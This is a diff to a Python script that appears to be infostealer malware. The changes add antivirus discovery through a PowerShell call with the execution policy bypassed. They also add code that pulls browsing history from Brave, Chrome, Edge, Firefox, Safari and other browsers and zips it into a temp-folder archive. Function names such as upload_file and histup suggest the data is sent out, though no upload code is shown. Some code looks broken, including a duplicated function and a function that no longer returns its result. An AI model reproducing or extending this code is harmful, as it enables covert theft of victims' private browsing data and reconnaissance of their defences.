@@ -374,32 +374,26 @@ def systemInfo():
 
     return sys_info
 
-import subprocess, os
-
 def avs():
-    file_path = os.path.expandvars(r'%LocalAppData%\Temp\winvs.txt')
-
-    if not os.path.exists(file_path):
-        open(file_path, 'w').close()
-
-    with open(file_path, 'w') as file:
-        file.write('')
-
-    scrs = r'''
-$antivirusProducts = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
-if ($antivirusProducts.Count -ge 2) {
-    $antivirusProducts | Out-File -FilePath "$env:LocalAppData\Temp\winvs.txt" -Append
-} elseif ($antivirusProducts.Count -eq 1) {
-    $antivirusProducts[0] | Out-File -FilePath "$env:LocalAppData\Temp\winvs.txt" -Append
+    script = r'''
+$filePath = "C:\Users\$env:username\AppData\Local\Temp\winvs.txt"
+if (-not (Test-Path -Path $filePath)) {
+    New-Item -Path $filePath -ItemType File
 }
+Clear-Content -Path $filePath
+Powershell -command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName" >> $filePath
 '''
 
-    subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass' "-Command", scrs])
+    subprocess.run(["powershell", '-NoProfile', '-ExecutionPolicy', 'Bypass', script])
+        
+    username = os.getlogin()
 
-    with open(file_path, 'r', encoding='utf-16') as file:
-        content = file.read().strip()
+    file_path = os.path.join('C:\\Users', username, 'AppData', 'Local', 'Temp', 'winvs.txt')
 
-    return content
+    with open(file_path, 'rb') as file:
+        content = file.read().decode('utf-8', errors='ignore').strip()
+
+avs()
 
 def globalInfo():
     
@@ -703,92 +697,115 @@ def upload_file(file_path):
 
 
 def find_history_file(browser_name, path_template):
-    try:
-        if os.name == "nt":
-            data_path = os.path.expanduser(path_template.format(browser_name))
-        elif os.name == "posix":
-            data_path = os.path.expanduser(path_template.format(browser_name))
-        else:
-            return None
+    if os.name == "nt":
+        data_path = os.path.expanduser(path_template.format(browser_name))
+    elif os.name == "posix":
+        data_path = os.path.expanduser(path_template.format(browser_name))
+    else:
+        return None
 
-        return data_path if os.path.exists(data_path) else None
-    except:
-        return None
-def find_chrome_history_file():
-    try:return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-    except:
-        return None
-def find_edge_history_file():
-    try:return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-    except:
-        return None
-def find_operagx_history_file():
+    return data_path if os.path.exists(data_path) else None
+
+def find_brave_history_file():
+    return os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'History')
+from urllib.parse import urlparse
+
+def get_brave_history(temp_dir, files_to_zip):
+    history_db = find_brave_history_file()
+
     try:
-        return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
-    except:
-        return None
+        conn = sqlite3.connect(history_db)
+        cursor = conn.cursor()
+
+        select_statement = "SELECT urls.url, urls.visit_count FROM urls, visits WHERE urls.id = visits.url;"
+        cursor.execute(select_statement)
+        results = cursor.fetchall()
+
+        def parse(url):
+            try:
+                parsed_url = urlparse(url)
+                domain = parsed_url.netloc.replace("www.", "")
+                return domain
+            except Exception as e:
+                print(f"URL format error: {str(e)}")
+
+        sites_count = {}
+
+        for url, count in results:
+            url = parse(url)
+            if url in sites_count:
+                sites_count[url] += 1
+            else:
+                sites_count[url] = 1
+
+        output_file = os.path.join(temp_dir, 'brave_search_history.txt')
+        with open(output_file, 'w', encoding='utf-8') as file:
+            for url, count in sites_count.items():
+                file.write(f"URL: {url}, Visits: {count}\n")
+
+        files_to_zip.append(output_file)
+
+        cursor.close()
+        conn.close()
+    except sqlite3.Error as e:
+        print(f"SQLite error: {str(e)}")
+        
+def find_chrome_history_file():
+    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+
+def find_chrome_history_file():
+    return find_history_file("Google\\Chrome\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+
+def find_edge_history_file():
+    return find_history_file("Microsoft\\Edge\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
+
+def find_operagx_history_file():
+    return find_history_file("Opera Software\\Opera GX Stable\\History", "~\\AppData\\Roaming\\{}")
 
 def find_firefox_history_file():
-    try:
-        if os.name == "nt":
-            profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
-        elif os.name == "posix":
-            profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
-        else:
-            return None
-
-        profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
-        if not profiles:
-            return None
-
-        profile_path = os.path.join(profile_path, profiles[0])
-        history_file_path = os.path.join(profile_path, "places.sqlite")
-
-        return history_file_path if os.path.exists(history_file_path) else None
-    except:
+    if os.name == "nt":
+        profile_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
+    elif os.name == "posix":
+        profile_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
+    else:
         return None
+
+    profiles = [f for f in os.listdir(profile_path) if f.endswith('.default')]
+    if not profiles:
+        return None
+
+    profile_path = os.path.join(profile_path, profiles[0])
+    history_file_path = os.path.join(profile_path, "places.sqlite")
+
+    return history_file_path if os.path.exists(history_file_path) else None
 
 def find_opera_history_file():
-    try:
-        return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
-    except:
-        return None
-    
-    
-def find_brave_history_file():
-    try:
-        return find_history_file("BraveSoftware\\Brave-Browser\\User Data\\Default\\History", "~\\AppData\\Local\\{}")
-    except:
-        return None
-
+    return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
 
 def find_safari_history_file():
-    try:
-        if os.name == "nt":
-            data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
-        elif os.name == "posix":
-            data_path = os.path.expanduser("~/Library/Safari/History.db")
-    except:
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\Apple\\Safari\\History.db")
+    elif os.name == "posix":
+        data_path = os.path.expanduser("~/Library/Safari/History.db")
+    else:
         return None
 
     return data_path if os.path.exists(data_path) else None
 
 def find_ie_history_file():
-    try:
-        if os.name == "nt":
-            data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
-    except:
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat")
+    else:
         return None
 
     return data_path if os.path.exists(data_path) else None
 
 def find_safari_technology_preview_history_file():
-    try:
-        if os.name == "nt":
-            data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
-        elif os.name == "posix":
-            data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
-    except:
+    if os.name == "nt":
+        data_path = os.path.expanduser("~\\Apple\\Safari Technology Preview\\History.db")
+    elif os.name == "posix":
+        data_path = os.path.expanduser("~/Library/SafariTechnologyPreview/History.db")
+    else:
         return None
 
     return data_path if os.path.exists(data_path) else None
@@ -807,12 +824,12 @@ def save_search_history_to_file(history_file, output_file):
             with open(output_file, 'w', encoding='utf-8') as file:
                 for item in search_history:
                     title, url, last_visit_time = item
-                    formatted_time = datetime.fromtimestamp(last_visit_time / 1000000).strftime('%Y-%m-%d %H:%M:%S')
-                    file.write(f"{formatted_time}: {title} - {url}\n")
+                    file.write(f"{title} - {url}\n")
         cursor.close()
         conn.close()
-    except (sqlite3.Error, IOError) as e:
-        pass
+    except sqlite3.Error as e:
+        if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
+            pass
 
 def is_process_running(process_name):
     try:
@@ -820,26 +837,22 @@ def is_process_running(process_name):
         return any(process_name.lower() in line.lower() for line in output.split('\n'))
     except subprocess.CalledProcessError:
         return False
-from datetime import datetime
-from time import time as timess
 
 def extract_history_with_timeout(browser_name, find_history_func, temp_dir, files_to_zip):
-    start_time = timess()
     browser_executable = f"{browser_name.lower().replace(' ', '_')}.exe"
     if is_process_running(browser_executable):
         return
 
     history_file = find_history_func()
-    elapsed_time = timess() - start_time
 
     if history_file:
         output_file = os.path.join(temp_dir, f"{browser_name.lower().replace(' ', '_')}_search_history.txt")
         try:
             save_search_history_to_file(history_file, output_file)
             files_to_zip.append(output_file)
-        except:
-            pass
-            
+        except sqlite3.Error as e:
+            if "unable to open database file" in str(e).lower() or "database is locked" in str(e).lower():
+                pass
 
 def create_browser_zip(browser_name, find_history_func, temp_dir):
     history_file = find_history_func()
@@ -860,11 +873,13 @@ def brohist():
         "Internet Explorer": find_ie_history_file,
         "Safari Technology Preview": find_safari_technology_preview_history_file,
     }
-    files_to_zip = []
 
     threads = []
     temp_dir = tempfile.mkdtemp()
-
+    files_to_zip = []
+    try:
+        get_brave_history(temp_dir, files_to_zip)
+    except:pass
     try:
         for browser_name, find_history_func in browsers.items():
             thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
@@ -875,18 +890,16 @@ def brohist():
             thread.join()
 
         if files_to_zip:
-            zip_file_name = os.path.join(os.path.expandvars('%temp%'), "browser.zip")
+            zip_file_name = os.path.join(os.path.expandvars('%temp%'), 'browser.zip')
             with zipfile.ZipFile(zip_file_name, 'w') as zipf:
                 for file_to_zip in files_to_zip:
                     if os.path.exists(file_to_zip):
                         zipf.write(file_to_zip, os.path.basename(file_to_zip))
                         os.remove(file_to_zip)
-    except:pass
     finally:
         for file_to_delete in files_to_zip:
             if os.path.exists(file_to_delete):
                 os.remove(file_to_delete)
-
 
 
 def histup():
